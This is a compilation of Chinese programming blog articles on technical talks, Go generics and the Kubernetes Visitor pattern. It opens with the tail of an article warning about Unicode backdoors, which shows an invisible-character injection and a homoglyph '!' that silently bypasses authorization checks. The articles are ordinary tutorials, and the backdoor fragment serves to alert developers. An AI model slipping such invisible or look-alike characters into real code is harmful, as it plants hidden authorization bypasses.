其中的，%E3%85%A4 就是 `\u3164` 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。

另外，还可以使用“同形字符”，看看下面这个示例：

```
if(environmentǃ=ENV_PROD){
    // bypass authZ checks in DEV
    return true;
}
```

如何你以为 `ǃ` 是 惊叹号，其实不是，它是一个Unicode `╟â`。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。

现在，是时候检查一下你的代码有没有上述的这些情况了……

（全文完）

# 如何做一个有质量的技术分享

#####  [2021年07月13日 ](https://coolshell.cn/articles/21589.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [28 条评论](https://coolshell.cn/articles/21589.html#comments) 79,059 人阅读

![img](photo/knowledge_sharing-300x169.jpeg)分享信息并不难，大多数人都能做到，就算是不善言谈性格内向的技术人员，通过博客或社交媒体，或是不正式的交流，他们都能或多或少的做到。但是如果你想要做一个有质量有高度的分享，这个就难了，所谓的有质量和有高度，我心里面的定义有两点：1）分享内容的保鲜期是很长的，2）会被大范围的传递。我们团队内每周都在做技术分享，虽然分享的主题都很有价值，但是分享的质量参差不齐，所以，想写下这篇文章 。供大家参考。

首先，我们先扪心自问一下，我们自己觉得读到的好的技术文章是什么？我不知道大家的是什么，我个人认为的好的文章是下面这样的：

- **把复杂的问题讲解的很简单也很清楚**。比如我高中时期读到这本1978年出版的《[从一到无穷大](https://book.douban.com/subject/1441922/)》，用各种简单通俗通懂的话把各种复杂的科学知识讲的清清楚楚。还有看过的几本很好的书，有一本是《[Windows程序设计](https://book.douban.com/subject/5273955/)》，从一个hello world的程序开始一步一步教你Windows下的原生态编程。
- **有各种各样的推导和方案的比较，让你知其然知其所以然**。有了不同方案的比较，才可能让人有全面的认识。这个方面的经典作著是《[Effective C++](https://book.douban.com/subject/5387403/)》。
- **原理、为什么、思路、方法论会让人一通百通**。这里面最经典的恐怕就是《[十万个为什么](https://book.douban.com/subject/5387403/)》了，在计算机方面也有几本经典书，有《[Unix编程艺术](https://book.douban.com/subject/1467587/)》、《[设计模式](https://book.douban.com/subject/1052241/)》、《[深入理解计算机系统](https://book.douban.com/subject/1230413/)》等书，以及《[The C10K Problem](http://www.kegel.com/c10k.html)》等很多技术论文。

其实，从教科书，到专业书，再到论文，都有上面这些不错的特质。

所以，如果你想做一个好的技术分享的话，下面是我总结出来的方法，供你参考。

- **先描述好一个问题**。这样能够听众带入进来，如果这个问题是他们感同身受的，那是最好了。千万不要一上来就说What，或是直接冲进答案里。这样的分享是在灌输和填鸭。把Why说清楚。没有Why，直接谈What的技术分享，通常来说价值不大。

- How比What重要

  。在讲How的时候，也就是如何解这个问题。

  - 先要把问题模型说清楚，有了问题模型这个框框后，方案才有意义。
  - 然后要有不同技术的比较。有了比较后，听众才会更相信你。
  - 直接上What的技术细节，其实没有太大意义。

- **一定要有Best Practice或方法论总结**，否则上不了档次的。也就是分享中大家可以得到的重要收获。

说明了这个模型就是：**问题 –> 方案 –> 总结。这其中是有一定的心理学模型的，具体表现如下：**

- 用问题来吸引受众，带着受众来一起思考
- 用问题模型来框住受众的思考范围，让受众聚焦
- 给出几种不同的解决方案，比较他们的优缺点，让受众有一种解决问题的参与感。
- 最后，给出最佳实践，方法论或套路，因为有了前三步的铺垫，受众欣然接受。
- 整个过程会让受众有强烈的成长感和收获感。

这里有几个示例，也是我在我司 MegaEase 内部的技术分享，供你参考（[我个人的YouTube频道](https://www.youtube.com/user/chenhaox/videhttps://www.youtube.com/channel/UCJhxX8SXcYdNWc6QMbWKs7Aos)）

技术分享：[Prometheus是怎么存储数据的](https://youtu.be/qB40kqhTyYM)（Youtube）



技术分享：[Distributed Lock Manager](https://www.youtube.com/watch?v=VnbC5RG1fEo)（Youtube）



下面是我写在我们公司内的Knowledge Sharing中的Best Practice，供参考

## Sharing Guideline

Please follow the following sharing protocols

### Understand Sharing

- Sharing is the hard way to learn knowledge. The presenter gains the biggest advantages. not audience. 分享是学习知识的最难的方式。分享者获得的好处最最多的，而不是观众。
- Sharing can open the knowledge door for the audience, but you have to walk to knowledge by yourself. 分享可以为听众打开知识的大门，但你能不能获得知识还要靠你自己。

### Best Practices

To perform a great sharing, please follow the below practices.

- Do not share a big topic, a small topic is better. A big topic could make the audience lose focus. Remember, [Less is More!](https://en.wikipedia.org/wiki/Minimalism#Minimalist_design_and_architecture)
- Sharing time less than 60 mins is the best.
- English language for slides is preferred.
- While prepare the sharing contents, it’s better to discuss with the senior people to help you to see the whole picture, understand the good side and bad side, know what you don’t know … etc.
- Strong Recommend Materials Outlines
  - What’s the Problem?
  - How to Solve the Problem?
  - The Best Solution or Practice.
  - The Mechanism, Key Techniques, and Source Code
  - Pros/Cons
  - References (Further reading)

> For example, if you want to sharing a topic about Docker. the following outlines would be good one:
>
> - What’s the major problems need to solve. (Provision, Environment, Isolation etc.)
> - The Alternative solutions. (Puppet/Chef/Ansible, VM, LXC etc.)
> - The Best Solution – Docker. Why?
> - Docker’s key techniques – image, cgroup, union fs, namespace…
> - Docker’s Pros/Cons
> - Further reading list.

![img](photo/截屏2021-07-13-12.53.33.png)

（全文完）

# GO编程模式 ： 泛型编程

#####  [2021年09月04日 ](https://coolshell.cn/articles/21615.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [14 条评论](https://coolshell.cn/articles/21615.html#comments) 58,555 人阅读

![img](photo/go-generics-1024x512.png)Go语言的1.17版本发布了，其中开始正式支持泛型了。虽然还有一些限制（比如，不能把泛型函数export），但是，可以体验了。我的这个《Go编程模式》的系列终于有了真正的泛型编程了，再也不需要使用反射或是go generation这些难用的技术了。周末的时候，我把Go 1.17下载下来，然后，体验了一下泛型编程，还是很不错的。下面，就让我们来看一下Go的泛型编程。（注：不过，如果你对泛型编程的重要性还不是很了解的话，你可以先看一下之前的这篇文章《[Go编程模式：Go Generation](https://coolshell.cn/articles/21179.html)》，然后再读一下《[Go编程模式：MapReduce](https://coolshell.cn/articles/21164.html)》）

### 本文是全系列中第10 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- Go编程模式 ： 泛型编程

« [上一篇文章](https://coolshell.cn/articles/21263.html)

目录



[初探](https://coolshell.cn/articles/21615.html#初探)[数据结构](https://coolshell.cn/articles/21615.html#数据结构)[Stack 栈](https://coolshell.cn/articles/21615.html#Stack_栈)[LinkList 双向链表](https://coolshell.cn/articles/21615.html#LinkList_双向链表)[函数式范型](https://coolshell.cn/articles/21615.html#函数式范型)[泛型Map](https://coolshell.cn/articles/21615.html#泛型Map)[泛型 Reduce](https://coolshell.cn/articles/21615.html#泛型_Reduce)[泛型 filter](https://coolshell.cn/articles/21615.html#泛型_filter)[业务示例](https://coolshell.cn/articles/21615.html#业务示例)

#### 初探

我们先来看一个简单的示例：



**package** main

**import** "fmt"

**func** print[T any] (arr []T) {

  **for** _, v := **range** arr {

​    fmt.Print(v)

​    fmt.Print(" ")

  }

  fmt.Println("")

}

**func** main() {

  strs := []**string**{"Hello", "World",  "Generics"}

  decs := []**float64**{3.14, 1.14, 1.618, 2.718 }

  nums := []**int**{2,4,6,8}

  print(strs)

  print(decs)

  print(nums)

}

上面这个例子中，有一个 `print()` 函数，这个函数就是想输出数组的值，如果没有泛型的话，这个函数需要写出 `int` 版，`float`版，`string` 版，以及我们的自定义类型（`struct`）的版本。现在好了，有了泛型的支持后，我们可以使用 `[T any]` 这样的方式来声明一个泛型类型（有点像C++的 `typename T`），然后面都使用 `T` 来声明变量就好。

上面这个示例中，我们泛型的 `print()` 支持了三种类型的适配—— `int`型，`float64`型，和 `string`型。要让这段程序跑起来需要在编译行上加上 `-gcflags=-G=3`编译参数（这个编译参数会在1.18版上成为默认参数），如下所示：

$ go run -gcflags=-G=3 ./main.go

有了个操作以后，我们就可以写一些标准的算法了，比如，一个查找的算法

**func** find[T comparable] (arr []T, elem T) **int** {

  **for** i, v := **range** arr {

​    **if**  v == elem {

​      **return** i

​    }

  }

  **return** -1

}

我们注意到，我们没有使用 `[T any]`的形式，而是使用 `[T comparable]`的形式，`comparable`是一个接口类型，其约束了我们的类型需要支持 `==` 的操作， 不然就会有类型不对的编译错误。上面的这个 `find()` 函数同样可以使用于 `int`, `float64`或是`string`类型。

从上面的这两个小程序来看，Go语言的泛型已基本可用了，只不过，还有三个问题：

- 一个是 `fmt.Printf()`中的泛型类型是 `%v` 还不够好，不能像c++ `iostream`重载 `>>` 来获得程序自定义的输出。
- 另外一个是，go不支持操作符重载，所以，你也很难在泛型算法中使用“泛型操作符”如：`==` 等
- 最后一个是，上面的 `find()` 算法依赖于“数组”，对于hash-table、tree、graph、link等数据结构还要重写。也就是说，没有一个像C++ STL那样的一个泛型迭代器（这其中的一部分工作当然也需要通过重载操作符（如：`++` 来实现）

不过，这个已经很好了，让我们来看一下，可以干哪些事了。

#### 数据结构

##### Stack 栈

编程支持泛型最大的优势就是可以实现类型无关的数据结构了。下面，我们用Slices这个结构体来实现一个Stack的数结构。

首先，我们可以定义一个泛型的Stack

**type** stack [T any] []T

看上去很简单，还是 `[T any]` ，然后 `[]T` 就是一个数组，接下来就是实现这个数据结构的各种方法了。下面的代码实现了 `push()` ，`pop()`，`top()`，`len()`，`print()`这几个方法，这几个方法和 C++的STL中的 Stack很类似。（注：目前Go的泛型函数不支持 export，所以只能使用第一个字符是小写的函数名）

**func** (s *stack[T]) push(elem T) {

  *s = append(*s, elem)

}

**func** (s *stack[T]) pop() {

  **if** len(*s) > 0 {

​    *s = (*s)[:len(*s)-1]

  } 

}

**func** (s *stack[T]) top() *T{

  **if** len(*s) > 0 {

​    **return** &(*s)[len(*s)-1]

  } 

  **return** **nil**

}

**func** (s *stack[T]) len() **int**{

  **return** len(*s)

}

**func** (s *stack[T]) print() {

  **for** _, elem := **range** *s {

​    fmt.Print(elem)

​    fmt.Print(" ")

  }

  fmt.Println("")

}

上面的这个例子还是比较简单的，不过在实现的过程中，对于一个如果栈为空，那么 `top()`要么返回`error`要么返回空值，在这个地方卡了一下。因为，之前，我们返回的“空”值，要么是 int 的`0`，要么是 string 的 `“”`，然而在泛型的`T`下，这个值就不容易搞了。也就是说，除了类型泛型后，还需要有一些“值的泛型”（注：在C++中，如果你要用一个空栈进行 `top()` 操作，你会得到一个 segmentation fault），所以，这里我们返回的是一个指针，这样可以判断一下指针是否为空。

下面是如何使用这个stack的代码。

**func** main() {

  ss := stack[**string**]{}

  ss.push("Hello")

  ss.push("Hao")

  ss.push("Chen")

  ss.print()

  fmt.Printf("stack top is - %v\n", *(ss.top()))

  ss.pop()

  ss.pop()

  ss.print()

  

  ns := stack[**int**]{}

  ns.push(10)

  ns.push(20)

  ns.print()

  ns.pop()

  ns.print()

  *ns.top() += 1

  ns.print()

  ns.pop()

  fmt.Printf("stack top is - %v\n", ns.top())

}

 

##### LinkList 双向链表

下面我们再来看一个双向链表的实现。下面这个实现中实现了 这几个方法：

- `add()` – 从头插入一个数据结点
- `push()` – 从尾插入一个数据结点
- `del()` – 删除一个结点（因为需要比较，所以使用了 `compareable` 的泛型）
- `print()` – 从头遍历一个链表，并输出值。

**type** node[T comparable] **struct** {

  data T

  prev *node[T]

  next *node[T]

}

**type** list[T comparable] **struct** {

  head, tail *node[T]

  len **int**

}

**func** (l *list[T]) isEmpty() **bool** {

  **return** l.head == **nil** && l.tail == **nil**

}

**func** (l *list[T]) add(data T) {

  n := &node[T] {

​    data : data,

​    prev : **nil**,

​    next : l.head,

  }

  **if** l.isEmpty() {

​    l.head = n

​    l.tail = n

  }

  l.head.prev = n

  l.head = n

}

**func** (l *list[T]) push(data T) { 

  n := &node[T] {

​    data : data,

​    prev : l.tail,

​    next : **nil**,

  }

  **if** l.isEmpty() {

​    l.head = n

​    l.tail = n

  }

  l.tail.next = n

  l.tail = n

}

**func** (l *list[T]) del(data T) { 

  **for** p := l.head; p != **nil**; p = p.next {

​    **if** data == p.data {

​      

​      **if** p == l.head {

​        l.head = p.next

​      }

​      **if** p == l.tail {

​        l.tail = p.prev

​      }

​      **if** p.prev != **nil** {

​        p.prev.next = p.next

​      }

​      **if** p.next != **nil** {

​        p.next.prev = p.prev

​      }

​      **return** 

​    }

  } 

}

**func** (l *list[T]) print() {

  **if** l.isEmpty() {

​    fmt.Println("the link list is empty.")

​    **return** 

  }

  **for** p := l.head; p != **nil**; p = p.next {

​    fmt.Printf("[%v] -> ", p.data)

  }

  fmt.Println("nil")

}

上面这个代码都是一些比较常规的链表操作，学过链表数据结构的同学应该都不陌生，使用的代码也不难，如下所示，都很简单，看代码就好了。

**func** main(){

  **var** l = list[**int**]{}

  l.add(1)

  l.add(2)

  l.push(3)

  l.push(4)

  l.add(5)

  l.print() //[5] -> [2] -> [1] -> [3] -> [4] -> nil

  l.del(5)

  l.del(1)

  l.del(4)

  l.print() //[2] -> [3] -> nil

  

}

#### 函数式范型

接下来，我们就要来看一下我们函数式编程的三大件 `map()` 、 `reduce()` 和 `filter()` 在之前的《[Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)》文章中，我们可以看到要实现这样的泛型，需要用到反射，代码复杂到完全读不懂。下面来看一下真正的泛型版本。

##### 泛型Map

**func** gMap[T1 any, T2 any] (arr []T1, f **func**(T1) T2) []T2 {

  result := make([]T2, len(arr))

  **for** i, elem := **range** arr {

​    result[i] = f(elem)

  }

  **return** result

}

在上面的这个 map函数中我使用了两个类型 – `T1` 和 `T2` ，

- `T1` – 是需要处理数据的类型
- `T2` – 是处理后的数据类型

`T1` 和 `T2` 可以一样，也可以不一样。

我们还有一个函数参数 – `func(T1) T2` 意味着，进入的是 `T1` 类型的，出来的是 `T2` 类型的。

然后，整个函数返回的是一个 `[]T2`

好的，我们来看一下怎么使用这个map函数：

nums := []**int** {0,1,2,3,4,5,6,7,8,9}

squares := gMap(nums, **func** (elem **int**) **int** {

  **return** elem * elem

})

print(squares)  //0 1 4 9 16 25 36 49 64 81 

strs := []**string**{"Hao", "Chen", "MegaEase"}

upstrs := gMap(strs, **func**(s **string**) **string**  {

  **return** strings.ToUpper(s)

})

print(upstrs) // HAO CHEN MEGAEASE 

dict := []**string**{"零", "壹", "贰", "叁", "肆", "伍", "陆", "柒", "捌", "玖"}

strs =  gMap(nums, **func** (elem **int**) **string**  {

  **return**  dict[elem]

})

print(strs) // 零 壹 贰 叁 肆 伍 陆 柒 捌 玖

##### 泛型 Reduce

接下来，我们再来看一下我们的Reduce函数，reduce函数是把一堆数据合成一个。

**func** gReduce[T1 any, T2 any] (arr []T1, init T2, f **func**(T2, T1) T2) T2 {

  result := init

  **for** _, elem := **range** arr {

​    result = f(result, elem)

  }

  **return** result

}

函数实现起来很简单，但是感觉不是很优雅。

- 也是有两个类型 `T1` 和 `T2`，前者是输出数据的类型，后者是佃出数据的类型。
- 因为要合成一个数据，所以需要有这个数据的初始值 `init`，是 `T2` 类型
- 而自定义函数 `func(T2, T1) T2`，会把这个init值传给用户，然后用户处理完后再返回出来。

下面是一个使用上的示例——求一个数组的和

nums := []int {0,1,2,3,4,5,6,7,8,9}

sum := gReduce(nums, 0, func (result, elem int) int  {

​    **return** result + elem

})

fmt.Printf("Sum = %d \n", sum)

##### 泛型 filter

filter函数主要是用来做过滤的，把数据中一些符合条件（filter in）或是不符合条件（filter out）的数据过滤出来，下面是相关的代码示例

**func** gFilter[T any] (arr []T, in **bool**, f **func**(T) **bool**) []T {

  result := []T{}

  **for** _, elem := **range** arr {

​    choose := f(elem)

​    **if** (in && choose) || (!in && !choose) {

​      result = append(result, elem)

​    }

  }

  **return** result

}

**func** gFilterIn[T any] (arr []T, f **func**(T) **bool**) []T {

  **return** gFilter(arr, **true**, f)

}

**func** gFilterOut[T any] (arr []T, f **func**(T) **bool**) []T {

  **return** gFilter(arr, **false**, f)

}

其中，用户需要提从一个 `bool` 的函数，我们会把数据传给用户，然后用户只需要告诉我行还是不行，于是我们就会返回一个过滤好的数组给用户。

比如，我们想把数组中所有的奇数过滤出来

nums := []**int** {0,1,2,3,4,5,6,7,8,9}

odds := gFilterIn(nums, **func** (elem **int**) **bool**  {

​    **return** elem % 2 == 1

})

print(odds)

#### 业务示例

正如《[Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)》中的那个业务示例，我们在这里再做一遍。

首先，我们先声明一个员工对象和相关的数据

**type** Employee **struct** {

  Name     **string**

  Age      **int**

  Vacation **int**

  Salary   **float32**

}

**var** employees = []Employee{

  {"Hao", 44, 0, 8000.5},

  {"Bob", 34, 10, 5000.5},

  {"Alice", 23, 5, 9000.0},

  {"Jack", 26, 0, 4000.0},

  {"Tom", 48, 9, 7500.75},

  {"Marry", 29, 0, 6000.0},

  {"Mike", 32, 8, 4000.3},

}

然后，我们想统一下所有员工的薪水，我们就可以使用前面的reduce函数

total_pay := gReduce(employees, 0.0, **func**(result **float32**, e Employee) **float32** {

  **return** result + e.Salary

})

fmt.Printf("Total Salary: %0.2f\n", total_pay) // Total Salary: 43502.05

我们函数这个 `gReduce` 函数有点啰嗦，还需要传一个初始值，在用户自己的函数中，还要关心 `result` 我们还是来定义一个更好的版本。

一般来说，我们用 reduce 函数大多时候基本上是统计求和或是数个数，所以，是不是我们可以定义的更为直接一些？比如下面的这个 `CountIf()`，就比上面的 Reduce 干净了很多。

**func** gCountIf[T any](arr []T, f **func**(T) **bool**) **int** {

  cnt := 0

  **for** _, elem := **range** arr {

​    **if** f(elem) {

​      cnt += 1

​    }

  }

  **return** cnt;

}

我们做求和，我们也可以写一个Sum的泛型。

- 处理 `T` 类型的数据，返回 `U`类型的结果
- 然后，用户只需要给我一个需要统计的 `T` 的 `U` 类型的数据就可以了。

代码如下所示：

**type** Sumable **interface** {

  **type** **int**, **int8**, **int16**, **int32**, **int64**,

​        **uint**, **uint8**, **uint16**, **uint32**, **uint64**,

​        **float32**, **float64**

}

**func** gSum[T any, U Sumable](arr []T, f **func**(T) U) U {

  **var** sum U

  **for** _, elem := **range** arr {

​    sum += f(elem)

  }

  **return** sum

}

上面的代码我们动用了一个叫 Sumable 的接口，其限定了 U 类型，只能是 Sumable里的那些类型，也就是整型或浮点型，这个支持可以让我们的泛型代码更健壮一些。

于是，我们就可以完成下面的事了。

**1）统计年龄大于40岁的员工数**

old := gCountIf(employees, **func** (e Employee) **bool**  {

​    **return** e.Age > 40

})

fmt.Printf("old people(>40): %d\n", old) 

// ld people(>40): 2

**2）统计薪水超过 6000元的员工数**

high_pay := gCountIf(employees, func(e Employee) bool {

  **return** e.Salary >= 6000

})

fmt.Printf("High Salary people(>6k): %d\n", high_pay) 

//High Salary people(>6k): 4

**3）统计年龄小于30岁的员工的薪水**

younger_pay := gSum(employees, **func**(e Employee) **float32** {

  **if** e.Age < 30 {

​      **return** e.Salary

  } 

  **return** 0

})

fmt.Printf("Total Salary of Young People: %0.2f\n", younger_pay)

//Total Salary of Young People: 19000.00

**4）统计全员的休假天数**

total_vacation := gSum(employees, **func**(e Employee) **int** {

  **return** e.Vacation

})

fmt.Printf("Total Vacation: %d day(s)\n", total_vacation)

//Total Vacation: 32 day(s)

**5）把没有休假的员工过滤出来**

no_vacation := gFilterIn(employees, **func**(e Employee) **bool** {

  **return** e.Vacation == 0

})

print(no_vacation)

//{Hao 44 0 8000.5} {Jack 26 0 4000} {Marry 29 0 6000}

怎么样，你大概了解了泛型编程的意义了吧。

（全文完）

# GO 编程模式：K8S VISITOR 模式

#####  [2020年12月26日 ](https://coolshell.cn/articles/21263.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [19 条评论](https://coolshell.cn/articles/21263.html#comments) 64,940 人阅读

![img](photo/go.k8s-265x300.png)本篇文章主要想讨论一下，Kubernetes 的 `kubectl` 命令中的使用到到的一个编程模式 – Visitor（注：其实，`kubectl` 主要使用到了两个一个是Builder，另一个是Visitor）。本来，Visitor 是面向对象设计模英中一个很重要的设计模款（参看Wikipedia[ Visitor Pattern词条](https://en.wikipedia.org/wiki/Visitor_pattern)），这个模式是一种将算法与操作对象的结构分离的一种方法。这种分离的实际结果是能够在不修改结构的情况下向现有对象结构添加新操作，是遵循开放/封闭原则的一种方法。这篇文章我们重点看一下 `kubelet` 中是怎么使用函数式的方法来实现这个模式的。

### 本文是全系列中第9 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- Go 编程模式：k8s Visitor 模式
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21228.html)[下一篇文章](https://coolshell.cn/articles/21615.html) »

目录



[一个简单示例](https://coolshell.cn/articles/21263.html#一个简单示例)[k8s相关背景](https://coolshell.cn/articles/21263.html#k8s相关背景)[kubectl的实现方法](https://coolshell.cn/articles/21263.html#kubectl的实现方法)[Visitor模式定义](https://coolshell.cn/articles/21263.html#Visitor模式定义)[Name Visitor](https://coolshell.cn/articles/21263.html#Name_Visitor)[Other Visitor](https://coolshell.cn/articles/21263.html#Other_Visitor)[Log Visitor](https://coolshell.cn/articles/21263.html#Log_Visitor)[使用方代码](https://coolshell.cn/articles/21263.html#使用方代码)[Visitor修饰器](https://coolshell.cn/articles/21263.html#Visitor修饰器)

#### 一个简单示例

我们还是先来看一个简单设计模式的Visitor的示例。

- 我们的代码中有一个`Visitor`的函数定义，还有一个`Shape`接口，其需要使用 `Visitor`函数做为参数。
- 我们的实例的对象 `Circle`和 `Rectangle`实现了 `Shape` 的接口的 `accept()` 方法，这个方法就是等外面给我传递一个Visitor。



```
package main

import (
    "encoding/json"
    "encoding/xml"
    "fmt"
)

type Visitor func(shape Shape)

type Shape interface {
    accept(Visitor)
}

type Circle struct {
    Radius int
}

func (c Circle) accept(v Visitor) {
    v(c)
}

type Rectangle struct {
    Width, Heigh int
}

func (r Rectangle) accept(v Visitor) {
    v(r)
}
```

然后，我们实现两个Visitor，一个是用来做JSON序列化的，另一个是用来做XML序列化的

```
func JsonVisitor(shape Shape) {
    bytes, err := json.Marshal(shape)
    if err != nil {
        panic(err)
    }
    fmt.Println(string(bytes))
}

func XmlVisitor(shape Shape) {
    bytes, err := xml.Marshal(shape)
    if err != nil {
        panic(err)
    }
    fmt.Println(string(bytes))
}
```

下面是我们的使用Visitor这个模式的代码

```
func main() {
  c := Circle{10}
  r :=  Rectangle{100, 200}
  shapes := []Shape{c, r}

  for _, s := range shapes {
    s.accept(JsonVisitor)
    s.accept(XmlVisitor)
  }

}
```

其实，这段代码的目的就是想解耦 数据结构和 算法，使用 Strategy 模式也是可以完成的，而且会比较干净。**但是在有些情况下，多个Visitor是来访问一个数据结构的不同部分，这种情况下，数据结构有点像一个数据库，而各个Visitor会成为一个个小应用。** `kubectl`就是这种情况。

#### k8s相关背景

接下来，我们再来了解一下相关的知识背景：

- 对于Kubernetes，其抽象了很多种的Resource，比如：Pod, ReplicaSet, ConfigMap, Volumes, Namespace, Roles …. 种类非常繁多，这些东西构成为了Kubernetes的数据模型（点击 [Kubernetes Resources 地图](https://github.com/kubernauts/practical-kubernetes-problems/blob/master/images/k8s-resources-map.png) 查看其有多复杂）
- `kubectl` 是Kubernetes中的一个客户端命令，操作人员用这个命令来操作Kubernetes。`kubectl` 会联系到 Kubernetes 的API Server，API Server会联系每个节点上的 `kubelet` ，从而达到控制每个结点。
- `kubectl` 主要的工作是处理用户提交的东西（包括，命令行参数，yaml文件等），然后其会把用户提交的这些东西组织成一个数据结构体，然后把其发送给 API Server。
- 相关的源代码在 `src/k8s.io/cli-runtime/pkg/resource/visitor.go` 中（[源码链接](https://github.com/kubernetes/kubernetes/blob/cea1d4e20b4a7886d8ff65f34c6d4f95efcb4742/staging/src/k8s.io/cli-runtime/pkg/resource/visitor.go)）

`kubectl` 的代码比较复杂，不过，其本原理简单来说，**它从命令行和yaml文件中获取信息，通过Builder模式并把其转成一系列的资源，最后用 Visitor 模式模式来迭代处理这些Reources**。

下面我们来看看 `kubectl` 的实现，为了简化，我用一个小的示例来表明 ，而不是直接分析复杂的源码。

#### kubectl的实现方法

##### Visitor模式定义

首先，`kubectl` 主要是用来处理 `Info`结构体，下面是相关的定义：

```
type VisitorFunc func(*Info, error) error

type Visitor interface {
    Visit(VisitorFunc) error
}

type Info struct {
    Namespace   string
    Name        string
    OtherThings string
}
func (info *Info) Visit(fn VisitorFunc) error {
  return fn(info, nil)
}
```

我们可以看到，

- 有一个 `VisitorFunc` 的函数类型的定义
- 一个 `Visitor` 的接口，其中需要 `Visit(VisitorFunc) error` 的方法（这就像是我们上面那个例子的 `Shape` ）
- 最后，为`Info` 实现 `Visitor` 接口中的 `Visit()` 方法，实现就是直接调用传进来的方法（与前面的例子相仿）

我们再来定义几种不同类型的 Visitor。

##### Name Visitor

这个Visitor 主要是用来访问 `Info` 结构中的 `Name` 和 `NameSpace` 成员

```
type NameVisitor struct {
  visitor Visitor
}

func (v NameVisitor) Visit(fn VisitorFunc) error {
  return v.visitor.Visit(func(info *Info, err error) error {
    fmt.Println("NameVisitor() before call function")
    err = fn(info, err)
    if err == nil {
      fmt.Printf("==> Name=%s, NameSpace=%s\n", info.Name, info.Namespace)
    }
    fmt.Println("NameVisitor() after call function")
    return err
  })
}
```

我们可以看到，上面的代码：

- 声明了一个 `NameVisitor` 的结构体，这个结构体里有一个 `Visitor` 接口成员，这里意味着多态。
- 在实现 `Visit()` 方法时，其调用了自己结构体内的那个 `Visitor`的 `Visitor()` 方法，这其实是一种修饰器的模式，用另一个Visitor修饰了自己（关于修饰器模式，参看《[Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)》）

##### Other Visitor

这个Visitor主要用来访问 `Info` 结构中的 `OtherThings` 成员

```
type OtherThingsVisitor struct {
  visitor Visitor
}

func (v OtherThingsVisitor) Visit(fn VisitorFunc) error {
  return v.visitor.Visit(func(info *Info, err error) error {
    fmt.Println("OtherThingsVisitor() before call function")
    err = fn(info, err)
    if err == nil {
      fmt.Printf("==> OtherThings=%s\n", info.OtherThings)
    }
    fmt.Println("OtherThingsVisitor() after call function")
    return err
  })
}
```

实现逻辑同上，我就不再重新讲了

##### Log Visitor

```
type LogVisitor struct {
  visitor Visitor
}

func (v LogVisitor) Visit(fn VisitorFunc) error {
  return v.visitor.Visit(func(info *Info, err error) error {
    fmt.Println("LogVisitor() before call function")
    err = fn(info, err)
    fmt.Println("LogVisitor() after call function")
    return err
  })
}
```

##### 使用方代码

现在我们看看如果使用上面的代码：

```
func main() {
  info := Info{}
  var v Visitor = &info
  v = LogVisitor{v}
  v = NameVisitor{v}
  v = OtherThingsVisitor{v}

  loadFile := func(info *Info, err error) error {
    info.Name = "Hao Chen"
    info.Namespace = "MegaEase"
    info.OtherThings = "We are running as remote team."
    return nil
  }
  v.Visit(loadFile)
}
```

上面的代码，我们可以看到

- Visitor们一层套一层
- 我用 `loadFile` 假装从文件中读如数据
- 最后一条 `v.Visit(loadfile)` 我们上面的代码就全部开始激活工作了。

上面的代码输出如下的信息，你可以看到代码的执行顺序是怎么执行起来了

```
LogVisitor() before call function
NameVisitor() before call function
OtherThingsVisitor() before call function
==> OtherThings=We are running as remote team.
OtherThingsVisitor() after call function
==> Name=Hao Chen, NameSpace=MegaEase
NameVisitor() after call function
LogVisitor() after call function
```

我们可以看到，上面的代码有以下几种功效：

- 解耦了数据和程序。
- 使用了修饰器模式
- 还做出来pipeline的模式

所以，其实，我们是可以把上面的代码重构一下的。

##### Visitor修饰器

下面，我们用[修饰器模式](https://coolshell.cn/articles/17929.html)来重构一下上面的代码。

```
type DecoratedVisitor struct {
  visitor    Visitor
  decorators []VisitorFunc
}

func NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {
  if len(fn) == 0 {
    return v
  }
  return DecoratedVisitor{v, fn}
}

// Visit implements Visitor
func (v DecoratedVisitor) Visit(fn VisitorFunc) error {
  return v.visitor.Visit(func(info *Info, err error) error {
    if err != nil {
      return err
    }
    if err := fn(info, nil); err != nil {
      return err
    }
    for i := range v.decorators {
      if err := v.decorators[i](info, nil); err != nil {
        return err
      }
    }
    return nil
  })
}
```

上面的代码并不复杂，

- 用一个 `DecoratedVisitor` 的结构来存放所有的`VistorFunc`函数
- `NewDecoratedVisitor` 可以把所有的 `VisitorFunc`转给它，构造 `DecoratedVisitor` 对象。
- `DecoratedVisitor`实现了 `Visit()` 方法，里面就是来做一个for-loop，顺着调用所有的 `VisitorFunc`

于是，我们的代码就可以这样运作了：

```
info := Info{}
var v Visitor = &info
v = NewDecoratedVisitor(v, NameVisitor, OtherVisitor)

v.Visit(LoadFile)
```

